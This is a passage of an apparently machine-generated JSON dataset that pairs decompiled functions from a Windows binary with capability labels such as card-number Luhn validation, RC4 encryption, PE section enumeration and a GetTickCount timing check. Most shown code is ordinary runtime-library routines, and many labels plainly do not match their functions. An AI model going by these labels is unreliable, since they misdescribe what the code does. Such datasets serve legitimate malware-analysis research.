        "decompiled_code": "\nint32_t fcn.00401aa5(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = fcn.004c8177(7, \"GetActiveWindow\", 0x55324c, 0x553254);\n    if (pcVar1 != NULL) {\n        (**0x573000)();\n        iVar2 = (*pcVar1)();\n        if (iVar2 != 0) {\n            pcVar1 = fcn.004c8177(10, \"GetLastActivePopup\", 0x5532b8, 0x5532c0);\n            if (pcVar1 == NULL) {\n                return iVar2;\n            }\n            (**0x573000)(iVar2);\n            iVar2 = (*pcVar1)();\n            return iVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 186
    },
    "00401ad2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401ad2(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.00405f60(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 191
    },
    "00418940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00418940(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h)\n\n{\n    code *pcVar1;\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e330;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(var_8h + 4, in_ECX + 1);\n    *var_20h = vtable.std::_System_error.0;\n    pcVar1 = *(var_8h + 0xc);\n    var_20h[4] = *(var_8h + 0x10);\n    var_20h[3] = pcVar1;\n    *var_20h = vtable.std::system_error.0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 363
    },
    "00401b5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00401b5e(float noname_0, uint arg_ch)\n\n{\n    float10 fVar1;\n    \n    fVar1 = fcn.00402bad(SUB84(noname_0, 0), noname_0 >> 0x20, arg_ch);\n    return fVar1;\n}\n",
        "token_count": 74
    },
    "00401b68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b68(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    arg_8h = *(arg_8h + 0x3c) + arg_8h;\n    iVar1 = *(arg_8h + 0x14) + 0x18 + arg_8h;\n    if (*(arg_8h + 6) != 0) {\n        do {\n            if ((*(iVar1 + 0xc) <= arg_ch) && (arg_ch < *(iVar1 + 8) + *(iVar1 + 0xc))) {\n                return iVar1;\n            }\n            uVar2 = uVar2 + 1;\n            iVar1 = iVar1 + 0x28;\n        } while (uVar2 < *(arg_8h + 6));\n    }\n    return 0;\n}\n",
        "token_count": 214
    },
    "00401b8b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b8b(code **arg_8h, code **arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    do {\n        if (arg_8h == arg_ch) {\n            return 0;\n        }\n        pcVar1 = *arg_8h;\n        if (pcVar1 != NULL) {\n            (**0x573000)();\n            iVar2 = (*pcVar1)();\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        arg_8h = arg_8h + 1;\n    } while( true );\n}\n",
        "token_count": 141
    },
    "0047c1f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047c1f8(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00401da2(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 137
    },
    "00401c8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401c8f(char *arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    \n    pcVar4 = arg_8h;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    pcVar4 = pcVar4 + (1 - (arg_8h + 1));\n    iVar3 = fcn.00403387(pcVar4, 1);\n    if (iVar3 != 0) {\n        if (pcVar4 != NULL) {\n            fcn.0040576d(iVar3, arg_8h, pcVar4);\n        }\n        return iVar3;\n    }\n    fcn.004010a5();\n    pcVar2 = swi(3);\n    iVar3 = (*pcVar2)();\n    return iVar3;\n}\n",
        "token_count": 218
    },
    "00401c9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00401c9e(int32_t param_1)\n\n{\n    *(param_1 + 0x3c) = 1;\n    fcn.004016ae(*(param_1 + 0x32), param_1 + 0x18);\n    return 1;\n}\n",
        "token_count": 68
    },
    "00401cbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401cbc(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x570068);\n    return;\n}\n",
        "token_count": 48
    },
    "00401cdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401cdf(int16_t *arg_8h)\n\n{\n    if (((*arg_8h == 0x5a4d) && (*(*(arg_8h + 0x1e) + arg_8h) == 0x4550)) && (*(*(arg_8h + 0x1e) + arg_8h + 6) == 0x10b)\n       ) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 110
    },
    "004022b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004022b6(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar1 = *arg_8h;\n            if (uVar1 - 0x41 < 0x1a) {\n                uVar1 = uVar1 + 0x20;\n            }\n            uVar2 = *arg_ch;\n            arg_8h = arg_8h + 1;\n            if (uVar2 - 0x41 < 0x1a) {\n                uVar2 = uVar2 + 0x20;\n            }\n            arg_ch = arg_ch + 1;\n        } while (((uVar1 - uVar2 == 0) && (uVar1 != 0)) && (arg_10h = arg_10h + -1,  arg_10h != 0));\n        return uVar1 - uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 250
    },
    "00401d61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00401d61(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_14h * 2);\n    fcn.00404c50(arg_14h * 2 + arg_8h, arg_1ch, arg_18h);\n    fcn.0040576d(arg_8h + (arg_14h + arg_18h) * 2, arg_ch + arg_14h * 2, (arg_10h - arg_14h) * 2 + 2);\n    return;\n}\n",
        "token_count": 172
    },
    "00401d93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401d93(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t lpCriticalSection;\n    \n    lpCriticalSection = 0x56f428;\n    uVar2 = 0;\n    do {\n        iVar1 = fcn.00404629(lpCriticalSection, 4000, 0);\n        if (iVar1 == 0) {\n            fcn.00404fa7();\n            return 0;\n        }\n        *0x56f440 = *0x56f440 + 1;\n        uVar2 = uVar2 + 0x18;\n        lpCriticalSection = lpCriticalSection + 0x18;\n    } while (uVar2 < 0x18);\n    return 1;\n}\n",
        "token_count": 166
    },
    "00401da2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401da2(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    uVar1 = 0;\n    uVar2 = uVar3;\n    if (uVar2 != 0xffff) {\n        if ((*(arg_ch + 0xc) == 0) && (uVar2 < 0x100)) {\n            uVar1 = uVar3 - 0x41;\n            if (uVar1 < 0x1a) {\n                uVar3 = uVar2 + 0x20;\n            }\n        }\n        else {\n            var_4h = uVar3;\n            uVar1 = fcn.004045b1(*(arg_ch + 0xc), 0x100, &arg_8h, 1, &var_4h, 1);\n            uVar3 = arg_8h & 0xffff;\n            if (uVar1 != 0) {\n                uVar3 = var_4h & 0xffff;\n            }\n        }\n    }\n    return uVar1 & 0xffff0000 | uVar3;\n}\n",
        "token_count": 296
    },
    "0047bb18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl\nfcn.0047bb18(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00406843(in_ECX, &var_ch, 0x54d9e8, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch, arg_20h);\n    fcn.004030df(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 258
    },
    "00401dca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00401dca(uint *arg_8h)\n\n{\n    char *var_8h;\n    uint var_4h;\n    \n    if ((((**0x56f458 != '\\0') && (**0x56f458 == '_')) && ((*0x56f458)[1] != '\\0')) && ((*0x56f458)[1] == 'E')) {\n        *0x56f458 = *0x56f458 + 2;\n        var_8h = \" noexcept\";\n        var_4h = 9;\n        fcn.00402cfc(&var_8h);\n        return arg_8h;\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    return arg_8h;\n}\n",
        "token_count": 177
    },
    "00401dde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401dde(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_ch) {\n        fcn.00403d55(arg_ch, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_ch;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.004058f3(in_ECX + iVar1 * 2, arg_8h, arg_ch * 2);\n        *(in_ECX + (iVar1 + arg_ch) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0047c132": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.0047c132(uint arg_8h, ushort *arg_ch, ushort *arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t *in_ECX;\n    \n    if (arg_ch != arg_10h) {\n        do {\n            pcVar1 = *(*in_ECX + 0x10);\n            (**0x573000)(arg_8h, *arg_ch);\n            cVar2 = (*pcVar1)();\n            if (cVar2 == '\\0') {\n                return arg_ch;\n            }\n            arg_ch = arg_ch + 1;\n        } while (arg_ch != arg_10h);\n    }\n    return arg_ch;\n}\n",
        "token_count": 158
    },
    "004047f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004047f5(void)\n\n{\n    code *pcVar1;\n    \n    fcn.00405fba(0, 0, 0, 0, 0);\n    fcn.004035f8(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 86
    },
    "00401e88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e88(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "00401e8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401e8d(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.0040355d(arg_8h, arg_ch, 0x7ffffffe);\n        arg_8h_00 = fcn.004043b8(iVar2 + 1);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = iVar2;\n        fcn.00404c50(arg_8h_00, arg_10h, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n        if (7 < arg_ch) {\n            fcn.00401659(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 310
    },
    "00401e97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00401e97(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.00493e7a(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 98
    },
    "00401e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401e9c(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00402c5c(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 197
    },
    "00401ebf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401ebf(int16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    uint *puVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t arg_8h_00;\n    int32_t arg_ch_00;\n    uint uVar9;\n    int16_t *piVar10;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x16;\n        return 0xffffffff;\n    }\n    piVar6 = fcn.0040505b(arg_8h, 0x3d);\n    piVar10 = arg_8h;\n    if ((piVar6 == NULL) || (piVar6 == arg_8h)) {\ncode_r0x004c73ca:\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x16;\n    }\n    else {\n        iVar3 = piVar6[1];\n        fcn.004c766e();\n        uVar9 = 0;\n        if (*0x56f890 == NULL) {\n            if ((arg_ch == 0) || (*0x56f88c == 0)) {\n                if (iVar3 == 0) {\n                    uVar9 = 0;\n                    goto code_r0x004c73d8;\n                }\n                if (*0x56f88c == 0) {\n                    *0x56f88c = fcn.00404fd9(1, 4);\n                    fcn.00406302(0);\n                    if (*0x56f88c == 0) goto code_r0x004c73d5;\n                    if (*0x56f890 != NULL) goto code_r0x004c7288;\n                }\n                *0x56f890 = fcn.00404fd9(1, 4);\n                fcn.00406302(0);\n            }\n            else {\n                iVar7 = fcn.004041ec();\n                if (iVar7 == 0) goto code_r0x004c73ca;\n                fcn.004c766e();\n            }\n            if (*0x56f890 == NULL) goto code_r0x004c73d5;\n        }\ncode_r0x004c7288:\n        piVar8 = *0x56f890;\n        arg_ch_00 = piVar6 - arg_8h >> 1;\n        iVar7 = fcn.004c76f8(arg_8h, arg_ch_00);\n        if ((-1 < iVar7) && (*piVar8 != 0)) {\n            fcn.00406302(piVar8[iVar7]);\n            if (iVar3 == 0) {\n                for (; piVar8[iVar7] != 0; iVar7 = iVar7 + 1) {\n                    piVar8[iVar7] = piVar8[iVar7 + 1];\n                }\n                piVar8 = fcn.00402cb6(piVar8, iVar7, 4);\n                fcn.00406302(0);\n                if (piVar8 != NULL) {\ncode_r0x004c7341:\n                    *0x56f890 = piVar8;\n                }\n            }\n            else {\n                piVar8[iVar7] = arg_8h;\n                piVar10 = NULL;\n            }\n            if (arg_ch != 0) {\n                piVar6 = arg_8h;\n                do {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                } while (iVar2 != 0);\n                iVar7 = (piVar6 - (arg_8h + 1) >> 1) + 2;\n                arg_8h_00 = fcn.00404fd9(iVar7, 2);\n                if (arg_8h_00 != 0) {\n                    iVar7 = fcn.004038dc(arg_8h_00, iVar7, arg_8h);\n                    if (iVar7 != 0) {\n                        fcn.004035f8(0, 0, 0, 0, 0);\n                        pcVar4 = swi(3);\n                        uVar9 = (*pcVar4)();\n                        return uVar9;\n                    }\n                    uVar1 = arg_8h_00 + (arg_ch_00 + 1) * 2;\n                    *(uVar1 - 2) = 0;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(arg_8h_00, -(iVar3 != 0) & uVar1);\n                    if (iVar7 == 0) {\n                        puVar5 = fcn.004039a4();\n                        uVar9 = 0xffffffff;\n                        *puVar5 = 0x2a;\n                    }\n                }\n                fcn.00406302(arg_8h_00);\n            }\n            goto code_r0x004c73d8;\n        }\n        if (iVar3 == 0) goto code_r0x004c73d8;\n        uVar1 = -iVar7 + 2;\n        if ((-iVar7 <= uVar1) && (uVar1 < 0x3fffffff)) {\n            piVar8 = fcn.00402cb6(piVar8, uVar1, 4);\n            fcn.00406302(0);\n            if (piVar8 != NULL) {\n                piVar8[-iVar7] = arg_8h;\n                piVar8[1 - iVar7] = 0;\n                piVar10 = NULL;\n                goto code_r0x004c7341;\n            }\n        }\n    }\ncode_r0x004c73d5:\n    uVar9 = 0xffffffff;\ncode_r0x004c73d8:\n    fcn.00406302(piVar10);\n    return uVar9;\n}\n",
        "token_count": 1361
    },
    "00401fb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401fb4(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e410;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00406587(param_1);\n    iVar1 = var_20h;\n    if (*(var_20h + 0x2c) != 0) {\n        fcn.004040d9(*(var_20h + 0x2c));\n    }\n    *(iVar1 + 0x2c) = 0;\n    if (*(iVar1 + 0x24) != 0) {\n        fcn.004040d9(*(iVar1 + 0x24));\n    }\n    *(iVar1 + 0x24) = 0;\n    if (*(iVar1 + 0x1c) != 0) {\n        fcn.004040d9(*(iVar1 + 0x1c));\n    }\n    *(iVar1 + 0x1c) = 0;\n    if (*(iVar1 + 0x14) != 0) {\n        fcn.004040d9(*(iVar1 + 0x14));\n    }\n    *(iVar1 + 0x14) = 0;\n    if (*(iVar1 + 0xc) != 0) {\n        fcn.004040d9(*(iVar1 + 0xc));\n    }\n    *(iVar1 + 0xc) = 0;\n    if (*(iVar1 + 4) != 0) {\n        fcn.004040d9(*(iVar1 + 4));\n    }\n    *(iVar1 + 4) = 0;\n    fcn.00403684();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 486
    },
    "00401fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401fdc(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0xc));\n    fcn.004040d9(*(param_1 + 0x10));\n    return;\n}\n",
        "token_count": 73
    },
    "00402022": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402022(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403bfc(arg_8h, arg_8h + 0x38, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 84
    },
    "00405a97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort __cdecl fcn.00405a97(uint arg_8h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    iVar2 = fcn.00403cdd(&var_4h, &arg_8h, 1, &var_ch, in_ECX + 0x18);\n    uVar1 = 0xffff;\n    if (-1 < iVar2) {\n        uVar1 = var_4h;\n    }\n    return uVar1;\n}\n",
        "token_count": 161
    },
    "0040209f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040209f(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar2 = *arg_8h;\n        uVar1 = *arg_ch;\n    }\n    else if (arg_10h == 2) {\n        iVar3 = *arg_8h - *arg_ch;\n        if (iVar3 != 0) goto code_r0x0048623f;\n        uVar2 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n    }\n    else if (arg_10h == 3) {\n        iVar3 = *arg_8h - *arg_ch;\n        if ((iVar3 != 0) || (iVar3 = *(arg_8h + 1) - *(arg_ch + 1),  iVar3 != 0)) goto code_r0x0048623f;\n        uVar2 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n    }\n    else {\n        if (arg_10h != 4) {\n            if (0x1f < arg_10h) {\n                do {\n                    if (*arg_8h != *arg_ch) {\n                        iVar3 = (*arg_8h & 0xff) - *arg_ch;\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 1) - *(arg_ch + 1),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 2) - *(arg_ch + 2),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 3) - *(arg_ch + 3);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[1] != arg_ch[1]) {\n                        iVar3 = (arg_8h[1] & 0xff) - *(arg_ch + 1);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 5) - *(arg_ch + 5),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 6) - *(arg_ch + 6),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 7) - *(arg_ch + 7);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[2] != arg_ch[2]) {\n                        iVar3 = (arg_8h[2] & 0xff) - *(arg_ch + 2);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 9) - *(arg_ch + 9),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 10) - *(arg_ch + 10),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[3] != arg_ch[3]) {\n                        iVar3 = (arg_8h[3] & 0xff) - *(arg_ch + 3);\n                        if (((iVar3 == 0) && (iVar3 = *(arg_8h + 0xd) - *(arg_ch + 0xd),  iVar3 == 0)) &&\n                           (iVar3 = *(arg_8h + 0xe) - *(arg_ch + 0xe),  iVar3 == 0)) {\n                            iVar3 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n                            if (iVar3 != 0) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                        else {\n                            iVar3 = (0 < iVar3) * 2 + -1;\n                        }\n                        if (iVar3 != 0) {\n                            return iVar3;\n                        }\n                    }\n                    if (arg_8h[4] != arg_ch[4]) {\n                        iVar3 = *(arg_8h + 4) - *(arg_ch + 4);\n                        if (((iVar3 == 0) && 